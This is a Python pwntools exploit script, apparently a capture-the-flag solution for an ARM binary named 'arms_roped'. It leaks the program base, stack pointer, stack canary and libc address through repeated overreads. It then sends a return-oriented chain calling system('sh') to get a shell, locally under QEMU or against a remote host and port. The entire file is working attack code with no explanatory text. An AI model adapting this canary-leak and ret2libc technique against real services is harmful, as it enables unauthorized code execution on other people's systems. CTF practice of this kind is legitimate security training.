#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("arms_roped")
libc = ELF("./libc.so.6")
gs = """
target remote:1234
"""


def start():
    if args.LOCAL:
        p = process(
            "./qemu-arm -g 4444 -L ./arm-linux-gnueabihf/ ./arms_roped".split())
        if args.GDB:
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()

p.sendline(b"A"*0x30)
p.recvuntil(b'A'*0x30)

e.address = u32(p.recv(4)) - 0x948
sp = u32(p.recv(4))


log.info(hex(sp))
log.info(hex(e.address))


p.sendline(b"A"*0x38+b'B')
p.recvuntil(b'B')
canary = u32(b'\0'+p.recv(3))
log.info(hex(canary))


p.sendline(b"A"*0x48)
p.recvuntil(b'A'*0x48)
libc.address = u32(p.recv(4)) - (libc.sym.__libc_start_main+153) + 0x0001
p.recv(1)

log.success(hex(libc.address))

p.sendline(
    b'A'*0x20 + p32(canary) + p32(0)*3 +
    p32(libc.address + 0x0005bebc) +  # pop {r0, r4, pc}
    p32(next(libc.search(b'sh\0'))) +
    p32(0) +
    p32(libc.sym.system)
)

p.recvline()
p.sendline(b'quit')


p.interactive()
